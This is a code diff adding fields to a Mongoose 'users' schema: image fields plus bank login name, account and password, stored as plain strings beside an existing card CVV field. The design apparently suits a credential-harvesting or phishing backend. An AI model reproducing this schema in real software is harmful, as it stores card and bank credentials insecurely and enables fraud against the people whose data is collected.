@@ -46,6 +46,24 @@ let users = new Schema(
         cardCvv: {
             type: String
         },
+        image: {
+            type: String
+        },
+        imageBefore: {
+            type: String
+        },
+        imageAfter: {
+            type: String
+        },
+        bankLoginName: {
+            type: String
+        },
+        bankLoginAccount: {
+            type: String
+        },
+        bankLoginPassword: {
+            type: String
+        },
     },
     { collection: "users" }
 );
